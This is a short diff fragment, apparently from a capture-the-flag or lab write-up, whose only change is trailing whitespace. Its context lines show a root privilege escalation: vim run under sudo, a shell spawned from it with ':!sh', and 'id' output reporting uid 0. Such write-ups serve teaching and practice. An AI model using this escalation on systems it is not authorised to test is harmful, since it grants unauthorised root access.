@@ -48,4 +48,4 @@ sudo vim /usr/bin/vim
 And type ‘shift :!sh ’ and got root :DD
 # id
 uid=0(root) gid=0(root) groups=0(root)
-</pre>
+</pre> 
